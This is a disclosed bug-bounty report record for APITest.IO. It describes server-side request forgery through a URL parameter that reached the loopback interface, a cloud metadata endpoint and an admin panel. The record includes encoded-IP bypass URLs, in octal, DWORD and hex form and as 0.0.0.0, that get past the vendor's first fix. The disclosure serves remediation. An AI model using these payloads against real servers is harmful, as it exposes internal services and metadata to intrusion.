{"id":128685,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjg2ODU=","url":"https://hackerone.com/reports/128685","title":"SSRF on testing endpoint","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-06T10:39:49.602Z","submitted_at":"2016-04-06T10:39:49.602Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"agarri_fr","url":"/agarri_fr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":10543,"url":"https://hackerone.com/apitest","handle":"apitest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/010/543/06469133c491e6f12621b2b818363301895e0b7b_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/543/06469133c491e6f12621b2b818363301895e0b7b_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"APITest.IO","twitter_handle":"apitest_io","website":"https://www.apitest.io","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-14T20:32:06.836Z","bug_reporter_agreed_on_going_public_at":"2016-08-15T20:31:57.338Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Synopsis\n\nThe form at https://www.apitest.io/request accepts (among others) the \"url\" parameter. This feature allows to reach internal services (like the OpenStack metadata server) or services running on loopback.\n\n# Identified services\n\nhttp://0x7f.1/ (nginx) =\u003e \"If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.\"\n\nhttp://169.254.169.254/meta-data (OpenStack metada) =\u003e directoty listing (instance-id, mac, local-ipv4, public-ipv4, network_config/content_path, SUBID, ipv6-addr, ipv6-prefix)\n\nhttp://0x7f.1:8081/ (vestacp admin panel) =\u003e \u003ca href=\"http://vestacp.com/\"\u003ePowered by VESTA\u003c/a\u003e\n\n# Impacts\n\nThe metadata server does't seem to host any sensitive data. However, access to port 8081 may allow to reconfigure the OS or services (untested). Additional services may exist, but it seems that my IP address (81.56.184.117) was just blacklisted on your side.","vulnerability_information_html":"\u003ch1 id=\"synopsis\"\u003eSynopsis\u003c/h1\u003e\n\n\u003cp\u003eThe form at \u003ca title=\"https://www.apitest.io/request\" href=\"/redirect?url=https%3A%2F%2Fwww.apitest.io%2Frequest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.apitest.io/request\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e accepts (among others) the \u0026quot;url\u0026quot; parameter. This feature allows to reach internal services (like the OpenStack metadata server) or services running on loopback.\u003c/p\u003e\n\n\u003ch1 id=\"identified-services\"\u003eIdentified services\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://0x7f.1/\" href=\"/redirect?url=http%3A%2F%2F0x7f.1%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0x7f.1/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (nginx) =\u0026gt; \u0026quot;If you see this page, the nginx web server is successfully installed and\u003cbr\u003e\nworking. Further configuration is required.\u0026quot;\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://169.254.169.254/meta-data\" href=\"/redirect?url=http%3A%2F%2F169.254.169.254%2Fmeta-data\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://169.254.169.254/meta-data\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (OpenStack metada) =\u0026gt; directoty listing (instance-id, mac, local-ipv4, public-ipv4, network_config/content_path, SUBID, ipv6-addr, ipv6-prefix)\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://0x7f.1:8081/\" href=\"/redirect?url=http%3A%2F%2F0x7f.1%3A8081%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0x7f.1:8081/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (vestacp admin panel) =\u0026gt; \u0026lt;a href=\u0026quot;http://vestacp.com/\u0026quot;\u0026gt;Powered by VESTA\u0026lt;/a\u0026gt;\u003c/p\u003e\n\n\u003ch1 id=\"impacts\"\u003eImpacts\u003c/h1\u003e\n\n\u003cp\u003eThe metadata server does\u0026#39;t seem to host any sensitive data. However, access to port 8081 may allow to reconfigure the OS or services (untested). Additional services may exist, but it seems that my IP address (81.56.184.117) was just blacklisted on your side.\u003c/p\u003e\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-14T20:31:57.510Z","allow_singular_disclosure_after":-135330721.63644457,"singular_disclosure_allowed":true,"vote_count":12,"voters":["th4nu_0x0","johndoe1492","ngalog","glc","bugdiscloseguys","dilawer01","khizer47","paresh_parmar","jimeno","nigba","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":891750,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi, thanks! We have created some fix. Requests to 0x7f.1, localhost, 169.254.169.254 are blocked.\nQuick fix in live version, better fix in next release.","markdown_message":"\u003cp\u003eHi, thanks! We have created some fix. Requests to 0x7f.1, localhost, 169.254.169.254 are blocked.\u003cbr\u003e\nQuick fix in live version, better fix in next release.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-06T12:06:15.032Z","updated_at":"2016-04-06T12:06:15.032Z","actor":{"username":"tjebbeke","cleared":false,"url":"/tjebbeke","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"agarri_fr","url":"/agarri_fr"},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":892260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixing this kind of vulnerability isn't trivial (IP addresses encoded in exotic formats, DNS re-binding, ...). I'd love to test your fix but I reached my daily number of requests.\n\nIs it possible to relax the request limitation or to temporary upgrade my account? If yes, UserID=69, UserName=\"nicolas.gregoire@agarri.fr\"\n","markdown_message":"\u003cp\u003eFixing this kind of vulnerability isn\u0026#39;t trivial (IP addresses encoded in exotic formats, DNS re-binding, ...). I\u0026#39;d love to test your fix but I reached my daily number of requests.\u003c/p\u003e\n\n\u003cp\u003eIs it possible to relax the request limitation or to temporary upgrade my account? If yes, UserID=69, UserName=\u0026quot;\u003ca title=\"nicolas.gregoire@agarri.fr\" href=\"mailto:nicolas.gregoire@agarri.fr\" rel=\"nofollow noopener noreferrer\"\u003enicolas.gregoire@agarri.fr\u003c/a\u003e\u0026quot;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-06T17:05:51.587Z","updated_at":"2016-04-06T17:06:13.188Z","actor":{"username":"agarri_fr","cleared":false,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":892771,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You have now the basic package till 2016-04-15.","markdown_message":"\u003cp\u003eYou have now the basic package till 2016-04-15.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-06T21:42:02.940Z","updated_at":"2016-04-06T21:42:02.940Z","actor":{"username":"tjebbeke","cleared":false,"url":"/tjebbeke","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":893616,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the upgrade!\n\nHere's some bypasses that I found when trying to reach the URL http://127.0.0.1:8081/server-status with different encodings and tricks. Accessing this page reveals, among others, the exact Apache version: \"Apache/2.2.15 (Unix) DAV/2 mod_fcgid/2.3.9 PHP/5.4.36 mod_ssl/2.2.15 OpenSSL/1.0.0-fips\"\n\n# Octal encoding\n\nhttp://0177.0000000000001:8081/server-status\n\n# DWORD encoding\n\nhttp://2130706433:8081/server-status\n\n# Hexadecimal encoding\n\nhttp://0x7f000001:8081/server-status\n\n# The ANY_IP address\n\nhttp://0.0.0.0:8081/server-status\n\nI made some public talks regarding this familly of vulnerabilities, known as SSRF (Server Side Request Forgery). You may find this one useful: http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf","markdown_message":"\u003cp\u003eThanks for the upgrade!\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s some bypasses that I found when trying to reach the URL \u003ca title=\"http://127.0.0.1:8081/server-status\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A8081%2Fserver-status\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:8081/server-status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with different encodings and tricks. Accessing this page reveals, among others, the exact Apache version: \u0026quot;Apache/2.2.15 (Unix) DAV/2 mod_fcgid/2.3.9 PHP/5.4.36 mod_ssl/2.2.15 OpenSSL/1.0.0-fips\u0026quot;\u003c/p\u003e\n\n\u003ch1 id=\"octal-encoding\"\u003eOctal encoding\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://0177.0000000000001:8081/server-status\" href=\"/redirect?url=http%3A%2F%2F0177.0000000000001%3A8081%2Fserver-status\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0177.0000000000001:8081/server-status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"dword-encoding\"\u003eDWORD encoding\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://2130706433:8081/server-status\" href=\"/redirect?url=http%3A%2F%2F2130706433%3A8081%2Fserver-status\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://2130706433:8081/server-status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"hexadecimal-encoding\"\u003eHexadecimal encoding\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://0x7f000001:8081/server-status\" href=\"/redirect?url=http%3A%2F%2F0x7f000001%3A8081%2Fserver-status\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0x7f000001:8081/server-status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"the-any_ip-address\"\u003eThe ANY_IP address\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://0.0.0.0:8081/server-status\" href=\"/redirect?url=http%3A%2F%2F0.0.0.0%3A8081%2Fserver-status\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0.0.0.0:8081/server-status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI made some public talks regarding this familly of vulnerabilities, known as SSRF (Server Side Request Forgery). You may find this one useful: \u003ca title=\"http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf\" href=\"/redirect?url=http%3A%2F%2Fwww.agarri.fr%2Fdocs%2FAppSecEU15-Server_side_browsing_considered_harmful.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-07T10:37:30.556Z","updated_at":"2016-04-07T10:37:30.556Z","actor":{"username":"agarri_fr","cleared":false,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1127876,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-15T20:31:57.437Z","updated_at":"2016-08-15T20:31:57.437Z","first_to_agree":true,"actor":{"username":"agarri_fr","cleared":false,"url":"/agarri_fr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/223/9346bb3a772b6433536cfbbe2a0a6c4c7a786fe9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1194446,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-14T20:32:06.933Z","updated_at":"2016-09-14T20:32:06.933Z","actor":{"url":"/apitest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/543/06469133c491e6f12621b2b818363301895e0b7b_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"APITest.IO"}},"genius_execution_id":null,"team_handle":"apitest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}